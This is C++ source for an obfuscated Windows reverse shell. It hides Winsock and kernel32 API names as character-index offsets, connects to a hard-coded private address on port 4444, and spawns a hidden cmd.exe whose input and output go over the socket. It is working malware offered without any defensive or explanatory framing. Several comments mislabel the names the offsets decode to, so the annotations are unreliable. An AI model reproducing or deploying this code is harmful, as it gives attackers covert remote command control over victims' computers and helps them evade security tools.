#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <stdio.h>
#include <Windows.h>
#include <iostream>
#pragma comment(lib, "ws2_32")

// Function pointers for dynamically loading Windows APIs
typedef FARPROC(WINAPI* GetProcAddressFunc)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* LoadLibraryFunc)(LPCSTR);

// Windows Sockets data structure
WSADATA wsaData;
SOCKET wSock; // Socket descriptor
struct sockaddr_in hax; // Structure to hold socket address
STARTUPINFO sui; // Structure for startup information of a process
PROCESS_INFORMATION pi; // Structure for process information

// Function pointer for WSASocket
typedef SOCKET(WINAPI* WSASocketFunc)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);
using namespace std;

// Helper function to obfuscate original strings
// This function takes two strings and returns their obfuscated index positions
void obfuscation(char* big_string, char* original_string) {
    for (int i = 0; i < strlen(original_string); i++) {
        for (int j = 0; j < strlen(big_string); ++j) {
            if (original_string[i] == big_string[j]) {
                printf("%d,", j); // Print the index of each character
            }
        }
    }
}

// De-obfuscation function
// Retrieves the original string from the obfuscated offsets
string getOriginalString(int offsets[], char* big_string, int sizeof_offset) {
    string empty_string = ""; // String to hold the reconstructed original string
    for (int i = 0; i < sizeof_offset / 4; ++i) {
        char character = big_string[offsets[i]]; // Get character from obfuscated offset
        empty_string += character; // Append character to the original string
    }
    return empty_string; // Return the reconstructed string
}

int main(int argc, char* argv[]) {
    // The big string containing all the characters used for obfuscation
    char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._123456789";
    
    // Obfuscated arrays representing original API function names and IP address
    char big_numbers[] = "1234567.890"; // String for obfuscating IP address
    int c_p_o[] = { 28, 17, 4, 0, 19, 4, 41, 17, 14, 2, 4, 18, 18, 26 }; // create_process_string
    int w_s_o[] = { 48, 44, 26, 44, 19, 0, 17, 19, 20, 15 }; // WSAStartup
    int w_c_o[] = { 48, 44, 26, 28, 14, 13, 13, 4, 2, 19 }; // connect
    int w_soc_offset[] = { 48, 44, 26, 44, 14, 2, 10, 4, 19 }; // WSASocket
    int h_t_o[] = { 7, 19, 14, 13, 18 }; // htons
    int i_a_o[] = { 8, 13, 4, 19, 53, 0, 3, 3, 17 }; // inet_addr
    int w_s_a_o[] = { 48, 44, 26, 44, 14, 2, 10, 4, 19, 26 }; // WSAAsyncSelect
    int w_f_s_o_o[] = { 48, 0, 8, 19, 31, 14, 17, 44, 8, 13, 6, 11, 4, 40, 1, 9, 4, 2, 19 }; // WaitForSingleObject
    int print_f_offset[] = { 15, 17, 8, 13, 19, 5 }; // printf
    int ipaddr_offset[] = { 0, 9, 1, 7, 0, 5, 8, 7, 0, 7, 4, 8 }; // 192.168.1.58
    int exe_c_m_d[] = { 2, 12, 3, 52, 4, 23, 4 }; // cmd.exe
    short port = 4444; // Target port
    int w_s_2_32lld[] = { 22, 18, 55, 53, 56, 55, 52, 3, 11, 11 }; // ws2_32.dll
    int k_renel_32[] = { 10, 4, 17, 13, 4, 11, 56, 55, 52, 3, 11, 11 }; // kernel32.dll

    // Loading the ws2_32 library using obfuscated string
    HMODULE w_s2_32lib = LoadLibraryA(getOriginalString(w_s_2_32lld, big_string, sizeof(w_s_2_32lld)).c_str());

    // Resolve dynamically loaded functions (obfuscated names)
    FARPROC w_sa_St_ar_tup = GetProcAddress(w_s2_32lib, getOriginalString(w_s_o, big_string, sizeof(w_s_o)).c_str());
    FARPROC Connectsaw = GetProcAddress(w_s2_32lib, getOriginalString(w_c_o, big_string, sizeof(w_c_o)).c_str());
    FARPROC wsaSocket = GetProcAddress(w_s2_32lib, getOriginalString(w_soc_offset, big_string, sizeof(w_soc_offset)).c_str());
    FARPROC htonsFunc = GetProcAddress(w_s2_32lib, getOriginalString(h_t_o, big_string, sizeof(h_t_o)).c_str());
    FARPROC inetAddr = GetProcAddress(w_s2_32lib, getOriginalString(i_a_o, big_string, sizeof(i_a_o)).c_str());

    // Initialize Winsock
    reinterpret_cast<int(WINAPI*)(WORD, LPWSADATA)>(w_sa_St_ar_tup)(MAKEWORD(2, 2), &wsaData);

    // Convert the string 'ws2_32.dll' into a wide string format
    string original_ws_2_32_dl_l = getOriginalString(w_s_2_32lld, big_string, sizeof(w_s_2_32lld)).c_str();
    wstring wide_original_ws_2_32_dl_l(original_ws_2_32_dl_l.begin(), original_ws_2_32_dl_l.end());
    
    // Retrieve the WSASocket function pointer
    WSASocketFunc wsaSocketFunc = reinterpret_cast<WSASocketFunc>(
        GetProcAddress(GetModuleHandle(wide_original_ws_2_32_dl_l.c_str()),getOriginalString(w_s_a_o, big_string, sizeof(w_s_a_o)).c_str()));

    // Create a socket
    wSock = wsaSocketFunc(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);

    // Setup the sockaddr_in structure
    hax.sin_family = AF_INET;
    hax.sin_port = reinterpret_cast<u_short(__stdcall*)(u_short)>(htonsFunc)(port);
    hax.sin_addr.s_addr = reinterpret_cast<unsigned long(__stdcall*)(const char*)>(inetAddr)(getOriginalString(ipaddr_offset, big_numbers, sizeof(ipaddr_offset)).c_str());

    // Attempt to connect to the remote server
    if (reinterpret_cast<int(WINAPI*)(SOCKET, const struct sockaddr*, int, LPWSABUF, LPWSABUF,
        LPQOS, LPQOS, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE)>(
        Connectsaw)(wSock, reinterpret_cast<const sockaddr*>(&hax), sizeof(hax), nullptr, nullptr, nullptr, nullptr, nullptr, nullptr) == 0) {
        printf("\n Connection successful \n"); // Connection successful
    }
    else {
        printf("Error: 0x%x\n", GetLastError()); // Print error code
    }

    // Retrieve process creation and wait functions
    FARPROC createProcess = GetProcAddress(LoadLibraryA(getOriginalString(k_renel_32, big_string, sizeof(k_renel_32)).c_str()),
        getOriginalString(c_p_o, big_string, sizeof(c_p_o)).c_str());
    FARPROC waitForSingleObject = GetProcAddress(LoadLibraryA(getOriginalString(k_renel_32, big_string, sizeof(k_renel_32)).c_str()),
        getOriginalString(w_f_s_o_o, big_string, sizeof(w_f_s_o_o)).c_str());

    // Prepare to startup a cmd process
    STARTUPINFOA sui;
    PROCESS_INFORMATION pi;
    memset(&sui, 0, sizeof(sui)); // Clear memory for startup info
    sui.cb = sizeof(sui); // Set size of the structure
    sui.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // Specify flags
    sui.wShowWindow = SW_HIDE; // Hide the window
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock; // Redirect I/O to socket

    // Create the cmd.exe process
    if (reinterpret_cast<BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
        BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION)>(
        createProcess)(nullptr, const_cast<LPSTR>(getOriginalString(exe_c_m_d, big_string, sizeof(exe_c_m_d)).c_str()), nullptr, nullptr, TRUE, 0, nullptr, nullptr, &sui, &pi)) {
        // Wait for the process to finish
        reinterpret_cast<DWORD(WINAPI*)(HANDLE, DWORD)>(waitForSingleObject)(pi.hProcess, INFINITE);
        FreeConsole(); // Free the console
        printf("BOOOOM !!!"); // Successful execution
    }

    return 0; // End of program
}
